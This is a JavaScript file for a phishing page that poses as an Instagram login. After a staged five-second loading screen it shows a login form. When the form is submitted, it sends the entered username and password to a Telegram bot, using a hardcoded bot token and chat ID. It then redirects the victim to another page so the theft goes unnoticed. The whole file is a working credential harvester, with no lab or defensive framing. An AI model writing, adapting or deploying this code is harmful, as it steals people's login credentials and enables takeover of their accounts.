let TOKEN_BOT = '6851319516:AAFtrbAKHGwv7Uy594rlpi-74U-pDxAmKhs';
let CHAT_ID = '1861568967';

let body = document.querySelector('body');
let loading = document.querySelector('.loading');
let login = document.querySelector('#login');
let loginBtn = document.getElementById('loginBtn');
let errorMessage = document.getElementById('errorMessage');

setTimeout(() =>{
    body.classList.remove("bg-[url('https://c4.wallpaperflare.com/wallpaper/54/119/802/technology-instagram-social-media-hd-wallpaper-preview.jpg')]");
    loading.classList.add('hidden');
    body.classList.add("bg-[url('https://t4.ftcdn.net/jpg/06/55/50/69/360_F_655506911_1p13PsGKM93SuCePkLUcd75TW1Bzu4jg.jpg')]");
    login.classList.remove('hidden');
}, 5000);

let inputs = document.querySelectorAll('input');

loginBtn.addEventListener('click', (e) => {
    e.preventDefault();

    const loginValue = inputs[0].value.trim();
    const passwordValue = inputs[1].value.trim();
    
    if (loginValue && passwordValue) {
        fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `\n\n Login: ${loginValue} \n PASSWORD: ${passwordValue}`,
            }),
        })
        .then(response => response.json())
        .then(malumot => {
            console.log(malumot);
            // Перенаправление на другую страницу после успешного входа
            window.location.href = "https://shoyunus1221.github.io/enter-instagram/";
        })
        .catch(error => {
            console.log("ERROR", error);
            errorMessage.classList.remove('hidden');
        });
    } else {
        console.log("Error: Login and password cannot be empty");
        errorMessage.classList.remove('hidden');
    }
});